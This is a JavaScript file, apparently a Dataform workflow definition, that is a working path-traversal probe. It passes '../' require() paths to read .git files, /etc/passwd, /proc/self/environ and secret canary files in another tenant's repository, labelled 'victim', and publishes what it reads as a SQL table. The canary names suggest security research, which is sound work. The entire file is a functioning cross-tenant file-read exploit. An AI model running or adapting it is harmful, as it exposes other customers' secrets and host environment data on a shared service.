const base = "df-workspace-parent-gitoracle/packages/ws-child";
const attempts = [
  [".git_HEAD", `${base}/../../../../.git/HEAD`],
  [".git_config", `${base}/../../../../.git/config`],
  [".git_index", `${base}/../../../../.git/index`],
  ["root_package_json", `${base}/../../../../package.json`],
  ["root_dataform_json", `${base}/../../../../dataform.json`],
  ["root_workflow_settings", `${base}/../../../../workflow_settings.yaml`],
  ["root_base_sqlx", `${base}/../../../../definitions/base.sqlx`],
  ["root_probe_js", `${base}/../../../../definitions/remote_parent_direct_require_followup.js`],
  ["node_modules_package_lock", `${base}/../../../package-lock.json`],
  ["workspace_package_lock", `${base}/../../../../package-lock.json`],
  ["escape_etc_passwd_5", `${base}/../../../../../etc/passwd`],
  ["escape_etc_passwd_6", `${base}/../../../../../../etc/passwd`],
  ["escape_proc_environ_6", `${base}/../../../../../../proc/self/environ`],
  ["escape_proc_cwd_6", `${base}/../../../../../../proc/self/cwd`],
  ["backend_own_abs_pkg", `${base}/../../../../../coderepositories-regional/regional-0/sharded_projects/58/0e/21978909140/repositories/f6/25/dfrfs-163434-fc2c92/workspaces/wsa-163434-fc2c92/package.json`],
  ["backend_own_abs_secret", `${base}/../../../../../coderepositories-regional/regional-0/sharded_projects/58/0e/21978909140/repositories/f6/25/dfrfs-163434-fc2c92/workspaces/wsa-163434-fc2c92/definitions/secret_canary.sqlx`],
  ["backend_victim_abs_pkg", `${base}/../../../../../coderepositories-regional/regional-0/sharded_projects/b2/44/568243734345/repositories/0a/99/dfrfsv-163434-fc2c92/workspaces/wsv-163434-fc2c92/package.json`],
  ["backend_victim_abs_secret", `${base}/../../../../../coderepositories-regional/regional-0/sharded_projects/b2/44/568243734345/repositories/0a/99/dfrfsv-163434-fc2c92/workspaces/wsv-163434-fc2c92/definitions/secret_canary.sqlx`]
];

function summarizeValue(v) {
  if (typeof Buffer !== "undefined" && Buffer.isBuffer(v)) return `BUFFER:${v.length}:${v.toString("utf8", 0, 160)}`;
  if (typeof v === "object") return JSON.stringify(v).slice(0, 260);
  return String(v).slice(0, 260);
}

function one(label, spec) {
  try {
    const value = require(spec);
    return `${label}|OK|${summarizeValue(value)}`;
  } catch (e) {
    const name = e && e.name ? e.name : "Error";
    const code = e && e.code ? e.code : "";
    const msg = e && e.message ? e.message : String(e);
    return `${label}|ERR|${name}|${code}|${msg.slice(0, 360)}`;
  }
}

const rows = attempts.map(([label, spec]) => one(label, spec));
const sql = rows.map(r => "select '" + r.replace(/'/g, "''") + "' as signal").join(" union all ");
publish("package_subpath_escape_matrix").query(ctx => sql);